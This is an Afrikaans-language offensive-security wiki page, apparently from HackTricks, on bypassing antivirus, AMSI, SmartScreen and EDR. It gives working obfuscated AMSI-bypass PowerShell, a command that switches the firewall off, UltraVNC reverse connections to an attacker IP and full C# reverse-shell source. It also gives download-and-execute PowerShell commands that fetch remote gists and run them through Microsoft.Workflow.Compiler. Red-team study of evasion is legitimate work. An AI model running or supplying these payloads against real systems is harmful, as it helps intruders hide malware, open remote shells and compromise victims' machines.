# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}


**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **AV Evasie Metodologie**

Tans gebruik AV's verskillende metodes om te kontroleer of 'n lêer kwaadwillig is of nie, statiese opsporing, dinamiese analise, en vir die meer gevorderde EDR's, gedragsanalise.

### **Statiese opsporing**

Statiese opsporing word bereik deur bekende kwaadwillige stringe of byte-reekse in 'n binêre of skrip te merk, en ook inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappynaam, digitale handtekeninge, ikoon, checksum, ens.). Dit beteken dat die gebruik van bekende openbare gereedskap jou makliker kan laat vang, aangesien hulle waarskynlik geanaliseer en as kwaadwillig gemerk is. Daar is 'n paar maniere om om hierdie tipe opsporing te omseil:

- **Enkripsie**

As jy die binêre enkripteer, sal daar geen manier wees vir AV om jou program te opspoor nie, maar jy sal 'n soort laaier nodig hê om die program in geheue te dekripteer en uit te voer.

- **Obfuskaasie**

Soms is al wat jy hoef te doen, om 'n paar stringe in jou binêre of skrip te verander om dit verby AV te kry, maar dit kan 'n tydrowende taak wees, afhangende van wat jy probeer obfuskeer.

- **Pasgemaakte gereedskap**

As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit neem baie tyd en moeite.

> [!NOTE]
> 'n Goeie manier om teen Windows Defender se statiese opsporing te kontroleer, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in verskeie segmente en vra dan Defender om elkeen individueel te skandeer, sodat dit jou presies kan sê wat die gemerkte stringe of byte in jou binêre is.

Ek beveel sterk aan dat jy hierdie [YouTube-speellys](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasie kyk.

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binêre in 'n sandbox uitvoer en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou blaaskas se wagwoorde te dekripteer en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie deel kan 'n bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandboxes te evade.

- **Slaap voor uitvoering** Afhangende van hoe dit geïmplementeer is, kan dit 'n wonderlike manier wees om AV se dinamiese analise te omseil. AV's het 'n baie kort tyd om lêers te skandeer om nie die gebruiker se werksvloei te onderbreek nie, so die gebruik van lang slape kan die analise van binêre versteur. Die probleem is dat baie AV's sandboxes eenvoudig die slaap kan oorslaan, afhangende van hoe dit geïmplementeer is.
- **Kontroleer masjien se hulpbronne** Gewoonlik het sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders kan hulle die gebruiker se masjien vertraag. Jy kan ook baie kreatief wees hier, byvoorbeeld deur die CPU se temperatuur of selfs die waaier spoed te kontroleer, nie alles sal in die sandbox geïmplementeer wees nie.
- **Masjien-spesifieke kontroles** As jy 'n gebruiker wil teiken wie se werkstasie aan die "contoso.local" domein gekoppel is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het, as dit nie is nie, kan jy jou program laat verlaat.

Dit blyk dat Microsoft Defender se Sandbox rekenaarnaam HAL9TH is, so jy kan die rekenaarnaam in jou malware kontroleer voor detonering, as die naam ooreenstem met HAL9TH, beteken dit jy is binne defender se sandbox, so jy kan jou program laat verlaat.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sommige ander regtig goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) om teen Sandboxes te gaan

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons voorheen in hierdie pos gesê het, **publieke gereedskap** sal uiteindelik **opgespoor word**, so jy moet jouself iets vra:

Byvoorbeeld, as jy LSASS wil dump, **het jy regtig nodig om mimikatz te gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump.

Die regte antwoord is waarskynlik die laaste. Om mimikatz as 'n voorbeeld te neem, dit is waarskynlik een van, indien nie die mees gemerkte stuk malware deur AV's en EDR's nie, terwyl die projek self super cool is, is dit ook 'n nagmerrie om mee te werk om AV's te omseil, so kyk net vir alternatiewe vir wat jy probeer bereik.

> [!NOTE]
> Wanneer jy jou payloads vir evasie aanpas, maak seker om **outomatiese monster indiening** in defender af te skakel, en asseblief, ernstig, **LAAT NIE OP VIRUSTOTAL OP NIE** as jou doel is om evasie op die lang termyn te bereik. As jy wil kontroleer of jou payload deur 'n spesifieke AV opgespoor word, installeer dit op 'n VM, probeer om die outomatiese monster indiening af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, moet jy altyd **prioriteit gee aan die gebruik van DLLs vir evasie**, in my ervaring, DLL-lêers word gewoonlik **baie minder opgespoor** en geanaliseer, so dit is 'n baie eenvoudige truuk om te gebruik om opsporing in sommige gevalle te vermy (as jou payload 'n manier het om as 'n DLL te loop natuurlik).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n opsporingskoers van 4/26 in antiscan.me, terwyl die EXE payload 'n 7/26 opsporingskoers het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van 'n normale Havoc EXE payload teen 'n normale Havoc DLL</p></figcaption></figure>

Nou sal ons 'n paar truuks wys wat jy met DLL-lêers kan gebruik om baie meer stil te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL soekorde wat deur die laaier gebruik word deur beide die slagoffer toepassing en kwaadwillige payload(s) langs mekaar te posisioneer.

Jy kan programme wat vatbaar is vir DLL Sideloading kontroleer met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell skrip:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL-hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitset.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable programme self verken**, hierdie tegniek is redelik stil as dit reg gedoen word, maar as jy publiek bekende DLL Sideloadable programme gebruik, kan jy maklik gevang word.

Net deur 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai, te plaas, sal jou payload nie laai nie, aangesien die program 'n paar spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.

**DLL Proxying** stuur die oproepe wat 'n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL, en behou sodoende die program se funksionaliteit en kan die uitvoering van jou payload hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Hierdie is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal vir ons 2 lêers gee: 'n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Hierdie is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (gecodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 Deteksie koers in [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons in diepte bespreek het.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n payload toolkit vir die omseiling van EDRs deur gebruik te maak van gestaakte prosesse, direkte syscalls, en alternatiewe uitvoeringsmetodes`

Jy kan Freeze gebruik om jou shellcode op 'n stil manier te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Ontwyking is net 'n kat & muis spel, wat vandag werk, kan môre opgespoor word, so moenie net op een hulpmiddel staatmaak nie, as dit moontlik is, probeer om verskeie ontwykingsmetodes te kombineer.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik was AV's slegs in staat om **lêers op skyf** te skandeer, so as jy op een of ander manier payloads **direk in-geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in hierdie komponente van Windows.

- Gebruikersrekeningbeheer, of UAC (verhoging van EXE, COM, MSI, of ActiveX-installasie)
- PowerShell (scripts, interaktiewe gebruik, en dinamiese kode-evaluasie)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA makros

Dit stel antivirusoplossings in staat om skripgedrag te ondersoek deur skripinhoud in 'n vorm bloot te stel wat beide nie-geënkripteer en nie-verbloem is nie.

Die uitvoering van `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing op Windows Defender produseer.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` voorafgaan en dan die pad na die uitvoerbare lêer waarvan die skrip gedraai het, in hierdie geval, powershell.exe

Ons het nie enige lêer op skyf gelaat nie, maar is steeds in-geheue gevang weens AMSI.

Daar is 'n paar maniere om rondom AMSI te kom:

- **Obfuskasie**

Aangesien AMSI hoofsaaklik met statiese opsporings werk, kan dit dus 'n goeie manier wees om die skripte wat jy probeer laai te wysig om opsporing te ontwyk.

Echter, AMSI het die vermoë om skripte te onobfuskate selfs al het dit verskeie lae, so obfuskasie kan 'n slegte opsie wees, afhangende van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontwyk nie. Alhoewel, soms is al wat jy hoef te doen, om 'n paar veranderlike name te verander en jy sal goed wees, so dit hang af van hoe veel iets gemerk is.

- **AMSI Ontwyking**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs terwyl jy as 'n nie-bevoegde gebruiker loop. Vanweë hierdie fout in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI-skandering te ontwyk.

**Dwing 'n Fout**

Om die AMSI-initialisering te dwing om te misluk (amsiInitFailed) sal daartoe lei dat geen skandering vir die huidige proses geïnisieer sal word nie. Oorspronklik is dit bekend gemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n handtekening ontwikkel om breër gebruik te voorkom.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles wat nodig was, was een lyn van powershell kode om AMSI onbruikbaar te maak vir die huidige powershell proses. Hierdie lyn is natuurlik deur AMSI self gemerk, so 'n paar wysigings is nodig om hierdie tegniek te gebruik.

Hier is 'n gewysigde AMSI omseiling wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gemeld sal word sodra hierdie pos uitkom, so jy moet nie enige kode publiseer as jou plan is om onopgemerk te bly nie.

**Geheue Patching**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en dit behels die vind van die adres vir die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker-geleverde invoer) en dit oorskryf met instruksies om die kode vir E_INVALIDARG terug te gee, sodat die resultaat van die werklike skandering 0 sal teruggee, wat as 'n skoon resultaat geïnterpreteer word.

> [!NOTE]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met powershell te omseil, kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/#amsi-bypass) en [hierdie repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

Of hierdie skrip wat via geheue patching elke nuwe Powersh sal patch.

## Obfuscation

Daar is verskeie gereedskap wat gebruik kan word om **C# duidelike tekskode** te **obfuskeer**, **metaprogrammering templates** te genereer om binaries te kompileer of **gecompileerde binaries** te obfuskeer soos:

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n oopbron-fork van die [LLVM](http://www.llvm.org/) kompilasiesuite te bied wat in staat is om verhoogde sagteware-sekuriteit te bied deur middel van [kode obfuskerings](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om `C++11/14` taal te gebruik om, tydens kompilering, obfuskeerde kode te genereer sonder om enige eksterne gereedskap te gebruik en sonder om die kompilator te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuskeerde operasies by wat deur die C++ template metaprogrammering raamwerk gegenereer word wat die lewe van die persoon wat die toepassing wil kraak 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat in staat is om verskeie verskillende pe-lêers te obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorfiese kode enjin vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fyn-gegradeerde kode obfuskeringsraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op die assembly kode vlak deur gewone instruksies in ROP-kettings te transformeer, wat ons natuurlike begrip van normale kontrole vloei verhoed.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is in staat om bestaande EXE/DLL in shellcode te omskakel en dit dan te laai.

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien toe jy sekere uitvoerbare lêers van die internet afgelaai en uitgevoer het.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van potensieel kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat ongewone afgelaaide toepassings SmartScreen sal aktiveer, wat die eindgebruiker waarsku en verhoed om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op Meer Inligting -> Voer steeds uit te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternatiewe Data Stroom](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam van Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat van die internet afgelaai is.</p></figcaption></figure>

> [!NOTE]
> Dit is belangrik om te noem dat uitvoerbare lêers wat met 'n **betroubare** ondertekeningssertifikaat **nie SmartScreen sal aktiveer** nie.

'n Baie effektiewe manier om jou payloads te verhoed om die Mark of The Web te kry, is om dit in 'n soort houer soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie NTFS** volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n gereedskap wat payloads in uitvoerhouers verpak om die Mark-of-the-Web te ontwyk.

Voorbeeld gebruik:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpakkie met behulp van [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Om C# binêre lêers in geheue te laai is al 'n geruime tyd bekend en dit is steeds 'n baie goeie manier om jou post-exploitation gereedskap te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in geheue gelaai sal word sonder om die skyf te raak, sal ons net oor die patching van AMSI vir die hele proses moet bekommer.

Meeste C2-raamwerke (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels **die ontstaan van 'n nuwe offer proses**, spuit jou post-exploitation kwaadwillige kode in daardie nuwe proses, voer jou kwaadwillige kode uit en wanneer dit klaar is, dood die nuwe proses. Dit het beide sy voordele en nadele. Die voordeel van die fork en run metode is dat uitvoering **buitentoe** ons Beacon implantaats proses plaasvind. Dit beteken dat as iets in ons post-exploitation aksie verkeerd gaan of gevang word, daar 'n **veel groter kans** is dat ons **implantaats oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Gedragsdeteksies** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die spuit van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep en dit deur AV te laat skandeer, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is om **jou beacon te verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> As jy meer oor C# Assembly laai wil lees, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Jy kan ook C# Assemblies **van PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Gebruik van Ander Programmeertale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode uit te voer met behulp van ander tale deur die gecompromitteerde masjien toegang te gee **tot die interpreter omgewing wat op die Aanvaller Beheerde SMB deel geïnstalleer is**.

Deur toegang tot die Interpreter Binaries en die omgewing op die SMB deel toe te laat, kan jy **arbitraire kode in hierdie tale binne die geheue** van die gecompromitteerde masjien uitvoer.

Die repo dui aan: Defender skandeer steeds die skrifte, maar deur Go, Java, PHP ens. te benut het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetsing met ewekansige on-obfuscated reverse shell skrifte in hierdie tale het suksesvol geblyk.

## Gevorderde Ontwyking

Ontwyking is 'n baie ingewikkelde onderwerp, soms moet jy baie verskillende bronne van telemetrie in net een stelsel in ag neem, so dit is feitlik onmoontlik om heeltemal onopgemerk te bly in volwasse omgewings.

Elke omgewing wat jy teenaan gaan, sal sy eie sterkpunte en swakpunte hê.

Ek moedig jou sterk aan om hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk, om 'n voet aan die grond te kry in meer Gevorderde Ontwyking tegnieke.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Dit is ook 'n ander goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Ontwyking in Diepte.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Ou Tegnieke**

### **Kontroleer watter dele Defender as kwaadwillig vind**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat **dele van die binêre lêer sal verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig vind en dit aan jou sal skei.\
Nog 'n hulpmiddel wat die **selfde ding doen is** [**avred**](https://github.com/dobin/avred) met 'n oop web wat die diens aanbied in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Bediening**

Tot Windows10, het alle Windows met 'n **Telnet bediener** gekom wat jy kon installeer (as administrateur) deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Maak dit **begin** wanneer die stelsel begin en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af van: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin-aflaaie hê, nie die opstelling nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:

- Aktiveer die opsie _Disable TrayIcon_
- Stel 'n wagwoord in _VNC Password_
- Stel 'n wagwoord in _View-Only Password_

Beweeg dan die binêre _**winvnc.exe**_ en **nuut** geskepte lêer _**UltraVNC.ini**_ binne die **slagoffer**

#### **Omgekeerde verbinding**

Die **aanvaller** moet **binne** sy **gasheer** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit **voorbereid** sal wees om 'n omgekeerde **VNC-verbinding** te vang. Dan, binne die **slagoffer**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WAARSKUWING:** Om stealth te handhaaf moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie of jy sal 'n [popup](https://i.imgur.com/1SROTTl.png) aktiveer. kyk of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie of dit sal [die konfigurasievenster](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp uitvoer nie of jy sal 'n [popup](https://i.imgur.com/oc18wcu.png) aktiveer

### GreatSCT

Laai dit af van: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nou **begin die lister** met `msfconsole -r file.rc` en **voer** die **xml payload** uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige verdediger sal die proses baie vinnig beëindig.**

### Ons eie omgekeerde dop saamstel

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Omgekeerde dop

Stel dit saam met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# gebruik van die kompilator
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C# obfuscators lys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

